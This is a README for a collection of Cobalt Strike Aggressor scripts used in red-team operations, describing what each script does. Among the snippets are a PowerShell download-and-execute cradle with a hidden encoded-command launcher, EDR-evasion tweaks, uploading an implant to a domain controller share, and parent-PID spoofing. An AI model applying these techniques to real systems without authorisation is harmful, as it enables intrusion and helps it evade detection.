## cobalt-arsenal

My published set of Aggressor Scripts for Cobalt Strike 4.0+

- **`Beacon_Initial_Tasks.cna`** - This script lets you configure **commands that should be launched as soon as the Beacon checks-in for the first time**. Both commands and argue settings are available in a dedicated options dialog. Also, a feature to right-click on a Beacon and issue "Run custom command..." was added to allow to run arbitrary commands against multiple beacons. Settings are then save in file specified in a global variable named:
     `$beaconInitialTasksSettingsFile`

   *How it works?*

   Implementation of `beacon_task()` functionality to invoke nearly-arbitrary Cobalt Strike commands
   from a passed string, from within your Aggressor scripts:
         ```
         beacon_task($bid, "execute-assembly C:\\tools\\Rubeus.exe hash /password:test");
         ```

- **`better-upload.cna`** - Simple yet **super handy** script that overrides built-in `upload` command by having one that offers additional, second parameter - being _remote file path_. By default we're only able to upload file to the CWD. This implementation let's us upload wherever we like. Additionally, it computes and prints out the MD5 checksum of every uploaded file for facilitating IOCs tracing:

```
beacon> upload implant.exe \\DC1\c$\windows\temp\implant.exe
[*] Tasked Beacon to upload file (size: 929.25KB, md5: 6465bb8a4af8dd2d93f8f386a16be341) from: (implant.exe) to: (\\DC1\c$\windows\temp\implant.exe)
[+] host called home, sent: 951655 bytes

```

- **`cwd-in-beacon-status-bar.cna`** - Simple Beacon console status bar enhancement showing Beacon's last known current working directory path, as well as adding fixed-width to last-seen meter. Additionally, this script enhances `cd` command to make it restore previous path if `cd -` was issued (and previous path is known).

- **`custom-powershell-hooks.cna`** - This script introduces several different methods for Powershell download and execution primitives, other than Cobalt Strike's default `(Net.WebClient).DownloadString` and `IEX()`:
```
		set POWERSHELL_DOWNLOAD_CRADLE {
			return "IEX (New-Object Net.Webclient).DownloadString(' $+ $1 $+ ')";
		}
		[...]

		set POWERSHELL_COMMAND {
		[...]
			return "powershell -nop -w hidden -encodedcommand $script";
		}
```

Aforementioned methods are heavily flagged these days by EDRs and AVs so we would prefer to avoid their use. It so happens that Cobalt Strike by default embeds them excessively, generating lot of noise in such systems. We can tell Cobalt Strike to structure it's Powershell use patterns differently. However, some of introduced custom methods may not work. In such situations, we can always switch back to battle tested Cobalt Strike defaults by setting `$USE_UNSAFE_ENCODEDCOMMAND_AND_IEX = 2;` in the script's header.

- **`FilesColor.cna`** - Color Coded Files Listing. Similar to `ProcessColor.cna` by [@r3dQu1nn](https://github.com/harleyQu1nn/AggressorScripts) this script colorizes file listing outputs based on file type and extension. **It also tries to keep track of uploaded files to have them highlighted in files listing as well**. The Colors scheme information will be showed only three times by default, unless configured otherwise via global variable named `$TIMES_TO_DISPLAY_COLORS_SCHEME`.

![FilesColor example](https://raw.githubusercontent.com/mgeeky/cobalt-arsenal/master/img/1.PNG)

- **`Forwarded_Ports.cna`** - Keeps track of configured remote port forwardings on all Beacons and lets kill them easily. Available in `View -> Remote Forwarded Ports`

   Using `rportfwd` here and there quickly consumes pool of available local ports from which to forward traffic outbound and keeping track of them manually becomes tedious on a long-haul projects. This script aims to fill that gap by collecting these commands and presenting them in a nice visualization pane (concept & implementation based on previous work of @ramen0x3f [leave_no_trace](https://github.com/ramen0x3f/AggressorScripts/blob/master/leave_no_trace.cna), @001SPARTaN and @r3dqu1nn [logvis.cna](https://github.com/invokethreatguy/AggressorCollection/blob/master/harleyQu1nn/logvis.cna) ).

- **`hash.cna`** - Implementation of MD5/SHA1/SHA256 hashing routines in aggressor script.

- **`Highlight_Beacons.cna`** - Highlights Beacons for a specified time duration (`$HIGHLIGHT_DURATION`) on Initial check-in event, when exiting (and after Beacon exited) and after each Beacon command's output. Configurable colors and events found in `%HIGHLIGHTS` dictionary. Hint: Specify `output => ""` to disable highlighting new Beacon command outputs.

- **`httprequest.cna`** - Safe & sound HTTP request implementation for Cobalt Strike 4.0 Aggressor Script. Works with HTTP & HTTPS, GET/POST/etc. + redirections. Rationale: I've tested various implementations of HTTP request sending subroutines written in Sleep for CS, but none of them matched by needs - working support for GET/POST, redirections handling and exceptions-safe execution. So I came up with my own implementation. ([gist](https://gist.github.com/mgeeky/2d7f8c2a6ffbfd23301e1e2de0312087)) 

- **`mgeekys_arsenal.cna`** - 3300+ kLOC stuffed with Cobalt Strike goodies, improvements, enhancements and aliases making workflow with Cobalt way much easier and nicer! This script combines most of the utilities placed in this repository:
  - Current working directory on status bar
  - Beacon initial actions
  - Better upload
  - handy aliases around most commonly used tools
  - super handy `execute-assembly` not requiring full path to the executable
  - auto Parent PID spoofing logic
  - and plenty more toys worth checking out!

  ![Arsenal window](https://raw.githubusercontent.com/mgeeky/cobalt-arsenal/master/mgeekys_arsenal/img/arsenal1.png)


- **`Payload_Variants_Generator.cna`** - This script generates stageless payload variants per each available architecture and output format type. Compatible with Cobalt Strike 4.0+.

- **`parse-error-codes.cna`** - A handy script that parses reported error codes and prints their corresponding Windows related meaning directly in Beacon's console output.

  **From:**
  ```
  beacon> ls C:\gdgsdfgdf
  [-] could not open C:\gdgsdfgdf\*: 3
  ```

  **To:**
  ```
  beacon> ls C:\gdgsdfgdf
  [-] could not open C:\gdgsdfgdf\*: 3. Parsed error code:
      3 - ERROR_PATH_NOT_FOUND
  ```

- **`rename-beacon-tabs.cna`** - Script that lets us rename Beacon-related tabs from a default format of: `Beacon <ip>@<pid>` to anything other we like, for instance: `B: <user>@<computer> (<pid>)`. 

   Format deciding how should each Beacon's tab be named, utilising beacon's metadata fields is described in a global variable named $beacon_tab_name_format . That variable may contain any of the following available beacon's metadata keys (CobaltStrike 4.2):

   `note, charset, internal , alive, session, listener, pid, lastf, computer, host, 
   is64, id, process, ver, last, os, barch, phint, external, port, build, pbid, arch, 
   user, _accent`


- **`settings.cna`** - Script that offers sample implementation for `saveOptions` and `loadOptions` routines, intended to store & restore settings from an external file.

- **`smart-autoppid.cna`** - Autoppid - script that smartely invokes PPID for every new checkin in Beacon. PPID command requires invoked Beacon to have the same Integrity level as the process it want's to assume as it's Parent. That's due to how InitializeProcThreadAttributeList with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS works. In order to avoid harcoded explorer.exe PID assumption, we can look around for a configurable process name and then try to find that process running on the highest available for us integrity level. In that case, unprivileged user would assume PPID of for instance svchost.exe running as that user, wherease the privileged one - could go for the svchost.exe running as NT AUTHORITY\SYSTEM. We aim to smartely pick the most advantageous target, in a dynamic fashion.

The same command is also exposed as an alias:

```
beacon> autoppid
[*] Tasked Beacon to find svchost.exe running as SYSTEM and make it the PPID.
[.] host called home, sent: 12 bytes
Future post-ex jobs will be spawned with fake PPID set to:
	svchost.exe	604	700	x64	NT AUTHORITY\SYSTEM	0

[*] Tasked beacon to spoof 700 as parent process
[.] host called home, sent: 12 bytes
```

